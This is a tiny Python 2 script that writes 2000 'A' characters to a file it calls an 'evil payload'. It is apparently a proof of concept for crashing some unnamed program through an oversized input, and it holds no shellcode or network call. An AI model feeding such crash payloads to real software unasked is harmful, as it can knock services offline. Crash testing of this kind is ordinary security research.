#!/usr/bin/python


buffer = "A" * 2000

f=open("Payload.txt","w")
print "[+] Creating %s bytes evil payload.." %len(buffer)
f.write(buffer)
f.close()
print "[+] File created!"


